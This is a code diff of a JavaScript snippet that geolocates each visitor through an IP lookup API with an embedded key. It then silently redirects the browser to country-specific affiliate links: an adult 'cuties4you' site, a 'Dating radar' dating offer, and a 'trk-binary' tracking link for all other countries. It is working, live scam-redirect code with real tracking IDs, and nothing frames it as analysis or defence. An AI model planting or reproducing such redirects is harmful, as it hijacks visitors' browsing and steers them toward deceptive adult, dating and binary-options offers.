@@ -14,16 +14,21 @@
         })();
     
     async function start() { 
-        let response = await fetch('https://api.ipfind.com/me?auth=c1fa6f62-bed4-49ae-9734-084fda9af264')
+        let response = await fetch('https://api.ipfind.com/me?auth=0496879e-7ad2-4554-9b0f-2d2d4f08e2b0')
         .then((response) => {
         return response.json();
           })
           .then((data) => {
             console.log(data.country_code);
-            if(data.country_code === 'UA') {
-                window.location.replace("https://trustclicker.com/?stream_key=VzCQumbIFg&pixel=");
-            }
-            else {
+            if(data.country_code === 'AT') {
+                window.location.replace("https://xxjgq.cuties4you.com/c/da57dc555e50572d?s1=32262&s2=1162219&j1=1&j3=1");
+            }else if(data.country_code === 'NZ') {
+                window.location.replace("https://xxjgq.cuties4you.com/c/da57dc555e50572d?s1=32262&s2=1162219&j1=1&j3=1");
+            }else if(data.country_code === 'DE') {
+                window.location.replace("https://track.tracksofast.com/click?pid=11947&offer_id=185&sub1=Dating radar");
+            }else if(data.country_code === 'CH') {
+                window.location.replace("https://track.tracksofast.com/click?pid=11947&offer_id=185&sub1=Dating radar");
+            }else {
                 window.location.replace("http://track.trk-binary.com/click?pid=4354&offer_id=1587");
             }
           });
